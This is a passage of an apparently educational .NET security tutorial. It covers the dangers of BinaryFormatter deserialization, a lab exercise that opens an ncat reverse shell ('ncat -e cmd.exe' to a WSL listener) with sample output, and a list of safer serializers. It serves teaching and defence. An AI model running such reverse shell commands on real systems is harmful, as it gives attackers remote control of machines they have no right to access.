# Binary Serialization

The [BinaryFormatter](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=net-8.0&?WT.mc_id=MVP_337682) is present in .NET Framework, .NET Core[^1], and .NET 5-8. Microsoft released an extensive statement about the dangers of using the BinaryFormatter here:

[BinaryFormatter Security Guide](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide?WT.mc_id=MVP_337682)

[^1]: Binary Formatter was removed in .NET Core 1.0, but reappeared in .NET Core 1.1 and onward.

On Feb. 9th, 2024, Microsoft announced the BinaryFormatter is being removed from .NET 9:

[Announcement: BinaryFormatter is being removed in .NET 9](https://github.com/dotnet/runtime/issues/98245)

## 



## Opening a Reverse Shell

Reverse shells allow an attacker to open a command shell on a vulnerable machine from the attacker's machine.In this exercise, we will open a reverse shell from Ubuntu running on WSL (Windows Subsystem for Linux) to the Windows host.

This is a two stage process starting with launching a listener from the attacker. Then executing a command from the vulnerable target to open a port and establish access to the target's shell from the attacker.

This uses [`ncat`](https://nmap.org/ncat/guide/index.html), a versatile networking tool with extensive command line options for opening connections.  

### Preparing for the Attack

1. Open an Ubuntu shell from a Windows Command or Powershell terminal:

    ``` bat
    wsl
    ```

1. Get the ip address of the Ubuntu instance.

    ``` bash
    ifconfig
    ```  

    Note the IP address associated with the eth0 network interface. This should be `172.30.181.236`. This will be used later to open the reverse shell from the target.  

1. Start the listener on port 2222.

    ``` bash
    ncat -vnlp 2222
    ```

    The options used here are:

    | parameter | description |
    | --- | --- |
    | -v | Set verbosity level (can be used several times) |  
    | -n | Do not resolve hostnames via DNS |  
    | -l | Bind and listen for incoming connections |  
    | -p | Specify source port to use |

The listener is now started on the attacking machine and ready to receive a connection from the target.

### Validating the Connection

Before executing the attack, verify that it will work from the target machine by directly opening the reverse shell. A real-world attacker would not have this option. Since this is a test environment, it can be used to verify the attack before adding more complexity with ysoserial.net and a REST request.

1. Open a Windows Command or Powershell terminal and run:

    ``` bat
    ncat -e cmd.exe -nv 172.30.181.236 2222
    ```

    Use the IP address of the Ubuntu instance from the prior section if it's differs from the example. The `-e` parameter executes `cmd.exe` when the connection is established.

1. Return to the Ubuntu instance running the listener. Observe that a Windows command prompt is now available.

    ``` bat
    username@hostname:/mnt/c/Users/user$ nc -vnlp 2222
    Listening on 0.0.0.0 2222
    Connection received on 172.30.176.1 13502
    Microsoft Windows [Version 10.0.22631.3296]
    (c) Microsoft Corporation. All rights reserved.
    C:\Windows\System32>
    ```

1. Run a few commands to validate the connection.

    ``` bat
    dir
    whoami
    hostname
    ipconfig
    ```

## Mitigating the Vulnerability

Migrating from the BinaryFormatter is not straight-forward as there is no direct replacement. If the BinaryFormatter has been used to persist data in a product or service then a migration strategy is necessary. The [BinaryFormatter Security Guide](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide?WT.mc_id=MVP_337682) recommends using:

- [XmlSerializer](https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view=net-8.0&WT.mc_id=MVP_337682) and [DataContractSerializer](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.datacontractserializer?view=net-8.0&WT.mc_id=MVP_337682) to serialize object graphs into and from XML. Do not confuse [DataContractSerializer](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.datacontractserializer?view=net-8.0&WT.mc_id=MVP_337682) with [NetDataContractSerializer](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer?view=netframework-4.8.1?WT.mc_id=MVP_337682).
- [BinaryReader](https://learn.microsoft.com/en-us/dotnet/api/system.io.binaryreader?view=net-8.0&WT.mc_id=MVP_337682) and [BinaryWriter](https://learn.microsoft.com/en-us/dotnet/api/system.io.binarywriter?view=net-8.0&WT.mc_id=MVP_337682) for XML and JSON.
- The [System.Text.Json](https://learn.microsoft.com/en-us/dotnet/api/system.text.json?view=net-8.0&WT.mc_id=MVP_337682) APIs to serialize object graphs into JSON.

Other alternatives include:

- [MessagePack](https://msgpack.org/) is a fast binary serializer.
- [ProtoBuf](https://protobuf.dev/getting-started/csharptutorial/). This is used by some Microsoft teams[^2].

[^2]: See Preparing for migration in [BinaryFormatter is being removed in .NET 9 #293](https://github.com/dotnet/announcements/issues/293)
